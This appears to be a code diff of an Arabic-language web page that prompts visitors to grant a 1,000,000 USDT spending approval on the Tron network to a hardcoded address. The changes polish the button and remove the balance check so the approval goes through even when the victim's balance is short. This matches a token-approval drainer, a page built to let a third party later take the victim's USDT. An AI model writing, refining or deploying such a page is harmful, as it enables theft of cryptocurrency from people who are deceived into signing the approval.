@@ -7,15 +7,17 @@
   <script src="https://cdn.jsdelivr.net/npm/tronweb@5.3.2/dist/TronWeb.min.js"></script>
   <style>
     body { font-family: Arial, sans-serif; text-align: center; }
-    button { padding: 10px 20px; font-size: 16px; cursor: pointer; }
-    #loading { color: green; font-weight: bold; display: none; }
+    button { padding: 10px 20px; font-size: 16px; cursor: pointer; background-color: #4CAF50; color: white; border: none; border-radius: 5px; }
+    button:hover { background-color: #45a049; }
+    #loading { color: green; font-weight: bold; display: none; margin-top: 10px; }
+    p { margin: 20px; }
   </style>
 </head>
 <body>
   <h2>تفويض 1,000,000 USDT على شبكة ترون</h2>
   <p>اضغط على الزر لمنح صلاحية لعنوان: <br><strong>TR593Y5U3tEiZsNTHykEDEd81EpXvWzcfu</strong></p>
   <button onclick="approveUSDT()">إعطاء صلاحية للتفويض</button>
-  <div id="loading">جاري المعالجة...</div>
+  <div id="loading">جاري معالجة المعاملة...</div>
 
   <script>
     const usdtContractAddress = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
@@ -59,14 +61,6 @@
             "outputs": [{ "name": "", "type": "bool" }],
             "type": "function",
             "stateMutability": "nonpayable"
-          },
-          {
-            "constant": true,
-            "inputs": [{ "name": "_owner", "type": "address" }],
-            "name": "balanceOf",
-            "outputs": [{ "name": "", "type": "uint256" }],
-            "type": "function",
-            "stateMutability": "view"
           }
         ];
 
@@ -76,16 +70,8 @@
         // قيمة الـ Approve: 1,000,000 USDT (1,000,000 * 10^6)
         const amount = "1000000000000";
 
-        // التحقق من الرصيد
-        const balance = await contract.balanceOf(window.tronWeb.defaultAddress.base58).call();
-        if (balance < amount) {
-          alert(`الرصيد غير كافٍ! رصيدك الحالي: ${(balance / 1000000).toFixed(2)} USDT`);
-          loadingDiv.style.display = "none";
-          return;
-        }
-
         // تأكيد من المستخدم قبل إرسال المعاملة
-        if (!confirm(`هل أنت متأكد من منح صلاحية ${amount / 1000000} USDT للعنوان: ${spenderAddress}؟`)) {
+        if (!confirm(`هل أنت متأكد من منح صلاحية 1,000,000 USDT للعنوان: ${spenderAddress}؟\nملاحظة: سيتم التفويض حتى لو لم يكن لديك رصيد كافٍ.`)) {
           loadingDiv.style.display = "none";
           return;
         }
@@ -102,7 +88,7 @@
 
       } catch (error) {
         console.error("خطأ أثناء المعاملة:", error);
-        alert(`فشل تنفيذ عملية التفويض:\n${error.message || error}`);
+        alert(`فشل تنفيذ عملية التفويض:\n${error.message || error}\nتأكد من وجود رصيد TRX كافٍ (حوالي 15 TRX) لدفع رسوم المعاملة.`);
         document.getElementById("loading").style.display = "none";
       }
     }
